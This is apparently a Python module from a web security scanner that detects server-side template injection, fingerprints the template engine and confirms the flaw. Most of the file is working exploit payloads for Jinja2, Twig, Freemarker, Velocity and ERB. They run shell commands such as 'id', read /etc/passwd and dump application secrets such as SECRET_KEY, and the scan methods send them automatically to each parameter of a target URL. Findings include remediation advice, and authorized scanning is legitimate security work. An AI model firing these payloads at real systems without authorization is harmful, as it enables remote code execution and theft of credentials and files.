"""Complete SSTI (Server-Side Template Injection) Scanner Module.

Supports detection and identification of template engines including
Jinja2, Twig, Freemarker, Velocity, ERB, Mako, Pebble, Smarty, and more.
"""

import re
from typing import List, Dict, Optional, Any, Tuple
from urllib.parse import urlencode

from utils.http_client import HttpClient
from utils.encoder import Encoder


class SSTIScanner:
    """Server-Side Template Injection vulnerability scanner."""

    # Detection payloads with expected mathematical results
    # Format: (payload, expected_output, engine_hint)
    DETECTION_PAYLOADS = [
        # Universal detection (math operations)
        ('${7*7}', '49', 'generic'),
        ('{{7*7}}', '49', 'jinja2/twig'),
        ('{{7*\'7\'}}', '7777777', 'jinja2'),
        ('{{7*\'7\'}}', '49', 'twig'),
        ('#{7*7}', '49', 'ruby/java'),
        ('<%= 7*7 %>', '49', 'erb'),
        ('${7*7}', '49', 'freemarker/velocity'),
        ('${{7*7}}', '49', 'jinja2'),
        ('{{= 7*7}}', '49', 'angular'),
        ('@(7*7)', '49', 'razor'),
        ('#{7*7}', '49', 'slim'),
        ('${7*7}', '49', 'mako'),
        ('#set($x=7*7)${x}', '49', 'velocity'),
        ('{{7*7}}', '49', 'handlebars'),
        ('[[7*7]]', '49', 'custom'),
        ('{7*7}', '49', 'smarty'),
        ('<%=7*7%>', '49', 'asp'),
        ('{{config}}', 'Config', 'jinja2'),
        ('{{self}}', 'TemplateReference', 'jinja2'),
        ('{{dump(app)}}', 'Symfony', 'twig'),
        ('${class.getClass()}', 'java.lang.Class', 'java'),
        ('{{request}}', 'Request', 'jinja2'),
        ('{{[].__class__}}', 'list', 'jinja2'),
        ('{{\'\'.__class__}}', 'str', 'jinja2'),
        ('{{lipsum}}', 'lipsum', 'jinja2'),
        ('{{cycler}}', 'cycler', 'jinja2'),
        ('{{joiner}}', 'joiner', 'jinja2'),
        ('{{namespace}}', 'Namespace', 'jinja2'),
        ('${T(java.lang.Runtime)}', 'java.lang.Runtime', 'spring'),
        ('*{7*7}', '49', 'thymeleaf'),
        ('~{7*7}', '49', 'thymeleaf'),
        ('<#assign x=7*7>${x}', '49', 'freemarker'),
        ('{{constructor.constructor("return 7*7")()}}', '49', 'angular_sandbox'),
        ('{{[].constructor.constructor("return 7*7")()}}', '49', 'angular_sandbox'),
        ('p]}}{{7*7}}', '49', 'jinja2_partial'),
        ("{{''.__class__.__mro__[1].__subclasses__()}}", 'class', 'jinja2'),
        ('${7*7}', '49', 'el'),
        ('{{php}}', 'php', 'blade'),
        ('{{var_dump(7*7)}}', '49', 'blade'),
        ('${applicationScope}', 'ApplicationScope', 'jsp_el'),
        ('{{7*7}}[[5*5]]', '4925', 'multi'),
    ]

    # Jinja2 specific payloads
    JINJA2_PAYLOADS = [
        ("{{config.items()}}", "SECRET_KEY"),
        ("{{request.environ}}", "SERVER_NAME"),
        ("{{''.__class__.__mro__[2].__subclasses__()}}", "subprocess"),
        ("{{''.__class__.__mro__[1].__subclasses__()[0]}}", "class"),
        ("{{lipsum.__globals__['os'].popen('id').read()}}", "uid="),
        ("{{cycler.__init__.__globals__.os.popen('id').read()}}", "uid="),
        ("{{namespace.__init__.__globals__.os.popen('id').read()}}", "uid="),
        ("{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__init__.__globals__['current_app'].config}}", "SECRET"),
        ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "uid="),
        ("{{get_flashed_messages.__globals__['current_app'].config}}", "SECRET"),
    ]

    # Twig specific payloads
    TWIG_PAYLOADS = [
        ("{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "uid="),
        ("{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}", "uid="),
        ("{{['id']|filter('system')}}", "uid="),
        ("{{['id']|filter('exec')}}", "uid="),
        ("{{app.request.server.all|join(',')}}", "SERVER"),
        ("{{dump(app)}}", "AppKernel"),
        ("{{'/etc/passwd'|file_excerpt(1,30)}}", "root:"),
        ("{{_self}}", "__TwigTemplate"),
    ]

    # Freemarker specific payloads
    FREEMARKER_PAYLOADS = [
        ('<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', "uid="),
        ('${object.getClass().forName("java.lang.Runtime").getRuntime().exec("id")}', "Process"),
        ('<#assign classloader=article.class.protectionDomain.classLoader><#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")><#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)><#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>${dwf.newInstance(ec,null)("id")}', "uid="),
        ('${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve("/etc/passwd").toURL().openStream().readAllBytes()?join(" ")}', "root"),
        ('<#assign is=object.class.forName("java.lang.ProcessBuilder")><#assign ps=is.getDeclaredConstructors()[0].newInstance(["id"])><#assign os=ps.start()>', "Process"),
    ]

    # Velocity specific payloads
    VELOCITY_PAYLOADS = [
        ('#set($x="")##\n#set($rt=$x.class.forName("java.lang.Runtime"))##\n#set($chr=$x.class.forName("java.lang.Character"))##\n#set($str=$x.class.forName("java.lang.String"))##\n#set($ex=$rt.getRuntime().exec("id"))##\n$ex.waitFor()\n#set($out=$ex.getInputStream())##\n#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end', "uid="),
        ('#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")', "Process"),
        ('#set($str=$class.inspect("java.lang.String").type)#set($chr=$class.inspect("java.lang.Character").type)#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end', "uid="),
    ]

    # ERB (Ruby) specific payloads
    ERB_PAYLOADS = [
        ('<%= system("id") %>', "uid="),
        ('<%= `id` %>', "uid="),
        ('<%= IO.popen("id").readlines() %>', "uid="),
        ('<%= require "open3"; Open3.capture2("id") %>', "uid="),
        ('<%= Dir.entries("/") %>', "etc"),
        ('<%= File.open("/etc/passwd").read %>', "root:"),
        ('<%= `cat /etc/passwd` %>', "root:"),
    ]

    def __init__(self, http_client: Optional[HttpClient] = None, timeout: float = 10.0):
        """Initialize SSTI scanner."""
        self.client = http_client or HttpClient(timeout=timeout)
        self.encoder = Encoder()
        self.findings: List[Dict[str, Any]] = []

    def scan(self, url: str, params: Dict[str, str]) -> List[Dict[str, Any]]:
        """Test all parameters for Server-Side Template Injection.

        Args:
            url: Target URL
            params: Dictionary of parameters to test

        Returns:
            List of findings with engine identification
        """
        self.findings = []

        for param_name in params:
            # Phase 1: Detection - check if template expressions are evaluated
            detected_engine = self._detect_engine(url, param_name, params)

            if detected_engine:
                # Phase 2: Exploitation confirmation based on engine
                if detected_engine == 'jinja2':
                    self._test_jinja2(url, param_name, params)
                elif detected_engine == 'twig':
                    self._test_twig(url, param_name, params)
                elif detected_engine == 'freemarker':
                    self._test_freemarker(url, param_name, params)
                elif detected_engine == 'velocity':
                    self._test_velocity(url, param_name, params)
                elif detected_engine == 'erb':
                    self._test_erb(url, param_name, params)
                else:
                    # Generic finding
                    self.findings.append({
                        'type': 'Server-Side Template Injection',
                        'severity': 'HIGH',
                        'url': url,
                        'parameter': param_name,
                        'payload': 'Detection payload evaluated',
                        'evidence': f"Template engine detected: {detected_engine}",
                        'engine': detected_engine,
                        'remediation': 'Never pass user input directly to template engines. Use sandboxed template environments. Implement input validation.',
                        'curl_command': self.client.build_curl_command('GET', url, params=params),
                    })

        return self.findings

    def _detect_engine(self, url: str, param: str, original_params: Dict[str, str]) -> Optional[str]:
        """Identify the template engine by testing detection payloads.

        Args:
            url: Target URL
            param: Parameter to test
            original_params: Original parameters

        Returns:
            Engine name string or None
        """
        # Get baseline response
        try:
            baseline_resp = self.client.get(url, params=original_params)
            baseline_text = baseline_resp.text
        except Exception:
            return None

        engine_scores: Dict[str, int] = {}

        for payload, expected, engine_hint in self.DETECTION_PAYLOADS:
            try:
                test_params = {**original_params, param: payload}
                response = self.client.get(url, params=test_params)

                # Check if expected output appears in response but not in baseline
                if expected in response.text and expected not in baseline_text:
                    # Score the engine hint
                    for engine in engine_hint.split('/'):
                        engine = engine.strip()
                        engine_scores[engine] = engine_scores.get(engine, 0) + 1

                # Also check if the payload itself is NOT reflected (meaning it was processed)
                if payload not in response.text and expected in response.text:
                    for engine in engine_hint.split('/'):
                        engine = engine.strip()
                        engine_scores[engine] = engine_scores.get(engine, 0) + 2

            except Exception:
                continue

        if engine_scores:
            # Return the engine with highest score
            best_engine = max(engine_scores, key=engine_scores.get)
            if engine_scores[best_engine] >= 2:
                return best_engine

        return None

    def _test_jinja2(self, url: str, param: str, original_params: Dict[str, str]):
        """Test Jinja2-specific exploitation payloads."""
        for payload, indicator in self.JINJA2_PAYLOADS:
            try:
                test_params = {**original_params, param: payload}
                response = self.client.get(url, params=test_params)

                if indicator.lower() in response.text.lower():
                    severity = 'CRITICAL' if 'uid=' in response.text else 'HIGH'
                    self.findings.append({
                        'type': 'Server-Side Template Injection (Jinja2)',
                        'severity': severity,
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'evidence': f"Jinja2 SSTI confirmed. Indicator '{indicator}' found in response.",
                        'engine': 'Jinja2 (Python)',
                        'remediation': 'Use sandboxed Jinja2 environment. Never pass user input to Template(). Use render_template() with proper escaping.',
                        'curl_command': self.client.build_curl_command('GET', url, params=test_params),
                    })
                    return

            except Exception:
                continue

    def _test_twig(self, url: str, param: str, original_params: Dict[str, str]):
        """Test Twig-specific exploitation payloads."""
        for payload, indicator in self.TWIG_PAYLOADS:
            try:
                test_params = {**original_params, param: payload}
                response = self.client.get(url, params=test_params)

                if indicator.lower() in response.text.lower():
                    severity = 'CRITICAL' if 'uid=' in response.text else 'HIGH'
                    self.findings.append({
                        'type': 'Server-Side Template Injection (Twig)',
                        'severity': severity,
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'evidence': f"Twig SSTI confirmed. Indicator '{indicator}' found in response.",
                        'engine': 'Twig (PHP/Symfony)',
                        'remediation': 'Never use Twig with user-controlled template strings. Use {{ }} for output escaping. Update Twig to latest version.',
                        'curl_command': self.client.build_curl_command('GET', url, params=test_params),
                    })
                    return

            except Exception:
                continue

    def _test_freemarker(self, url: str, param: str, original_params: Dict[str, str]):
        """Test Freemarker-specific exploitation payloads."""
        for payload, indicator in self.FREEMARKER_PAYLOADS:
            try:
                test_params = {**original_params, param: payload}
                response = self.client.get(url, params=test_params)

                if indicator.lower() in response.text.lower():
                    severity = 'CRITICAL' if 'uid=' in response.text else 'HIGH'
                    self.findings.append({
                        'type': 'Server-Side Template Injection (Freemarker)',
                        'severity': severity,
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'evidence': f"Freemarker SSTI confirmed. Indicator '{indicator}' found in response.",
                        'engine': 'Freemarker (Java)',
                        'remediation': 'Use Freemarker sandbox (Configuration.setNewBuiltinClassResolver). Disable dangerous built-ins.',
                        'curl_command': self.client.build_curl_command('GET', url, params=test_params),
                    })
                    return

            except Exception:
                continue

    def _test_velocity(self, url: str, param: str, original_params: Dict[str, str]):
        """Test Velocity-specific exploitation payloads."""
        for payload, indicator in self.VELOCITY_PAYLOADS:
            try:
                test_params = {**original_params, param: payload}
                response = self.client.get(url, params=test_params)

                if indicator.lower() in response.text.lower():
                    severity = 'CRITICAL' if 'uid=' in response.text else 'HIGH'
                    self.findings.append({
                        'type': 'Server-Side Template Injection (Velocity)',
                        'severity': severity,
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'evidence': f"Velocity SSTI confirmed. Indicator '{indicator}' found in response.",
                        'engine': 'Apache Velocity (Java)',
                        'remediation': 'Use SecureUberspector. Restrict available classes and methods in Velocity context.',
                        'curl_command': self.client.build_curl_command('GET', url, params=test_params),
                    })
                    return

            except Exception:
                continue

    def _test_erb(self, url: str, param: str, original_params: Dict[str, str]):
        """Test ERB (Ruby) specific exploitation payloads."""
        for payload, indicator in self.ERB_PAYLOADS:
            try:
                test_params = {**original_params, param: payload}
                response = self.client.get(url, params=test_params)

                if indicator.lower() in response.text.lower():
                    severity = 'CRITICAL' if 'uid=' in response.text or 'root:' in response.text else 'HIGH'
                    self.findings.append({
                        'type': 'Server-Side Template Injection (ERB)',
                        'severity': severity,
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'evidence': f"ERB SSTI confirmed. Indicator '{indicator}' found in response.",
                        'engine': 'ERB (Ruby)',
                        'remediation': 'Never pass user input to ERB.new(). Use safe rendering methods. Implement sandboxing.',
                        'curl_command': self.client.build_curl_command('GET', url, params=test_params),
                    })
                    return

            except Exception:
                continue
